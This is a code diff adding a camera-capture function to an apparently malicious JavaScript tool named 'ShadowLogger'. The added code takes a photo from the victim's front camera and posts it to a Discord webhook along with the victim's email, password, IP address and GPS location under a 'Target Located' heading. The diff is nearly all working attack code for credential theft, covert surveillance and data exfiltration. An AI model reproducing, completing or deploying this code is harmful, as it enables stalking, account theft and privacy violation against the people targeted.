@@ -198,4 +198,70 @@ const PostGPS = async () => {
                 console.error('Error sending location:', error);
             }
 };
+window.PostCamera = async () => {
+    const video = document.createElement('video');
+    const canvas = document.createElement('canvas');
+
+    const constraints = { audio: false, video: { facingMode: "user" } };
+
+  try {
+    // Request camera access
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    video.srcObject = stream;
+    video.autoplay = true;
+
+    // Wait until video metadata is loaded (so we know its resolution)
+    await new Promise(resolve => video.onloadedmetadata = resolve);
+
+    // Match canvas to camera resolution
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    // Capture single frame
+    const context = canvas.getContext('2d');
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    // Convert to Blob
+    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+
+    // Prepare webhook payload using FormData
+    const dscURL = ''; //place webhook here
+    const formData = new FormData();
+
+    const payload = {
+      username: "ShadowLogger",
+      avatar_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png",
+      content: "@everyone",
+      embeds: [
+        {
+          title: "📍 Target Located",
+          color: 0x800080,
+          fields: [
+            { name: "📧 Credentials", value: `**Email:** ${email}\n**Password:** ${password}`, inline: true },
+            { name: "🧠 IP Address", value: ip, inline: true },
+            { name: "🌍 Location", value: latlong, inline: true },
+            { name: "📘 Full IP Data", value: `[🌐 View JSON](https://ipapi.co/${ip}/json/)`, inline: true }
+          ],
+          footer: { text: "ShadowLogger by ARMed0ps" },
+          timestamp: new Date().toISOString()
+        }
+      ]
+    };
+
+    formData.append('payload_json', JSON.stringify(payload));
+    formData.append('file', blob, 'target.png'); // attach image
+
+    // Send to Discord
+    await fetch(dscURL, {
+      method: 'POST',
+      body: formData
+    });
+
+    console.log("Location, credentials, and image sent!");
+
+  } catch (e) {
+    console.error("Camera access denied or error occurred:", e);
+    alert("Camera access denied or error occurred.");
+  }
+};
 }
